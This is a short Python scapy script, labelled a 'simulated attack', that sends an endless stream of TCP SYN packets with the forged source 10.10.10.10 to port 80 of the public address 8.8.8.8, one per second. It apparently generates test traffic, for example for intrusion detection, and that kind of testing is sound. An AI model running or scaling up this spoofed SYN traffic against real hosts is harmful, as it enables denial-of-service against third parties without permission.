import time
from scapy.all import IP, TCP, send
import random

target_ip = "8.8.8.8" 

print("--- STARTING SIMULATED ATTACK ---")
print("Injecting Malicious Traffic (Small Packets, SYN Flags)...")

while True:
    fake_ip = "10.10.10.10"
    
    packet = IP(src=fake_ip, dst=target_ip)/TCP(dport=80, flags="S")
    
    send(packet, verbose=False)
    print(f"Sent Spoofed Packet from {fake_ip}")
    
    time.sleep(1)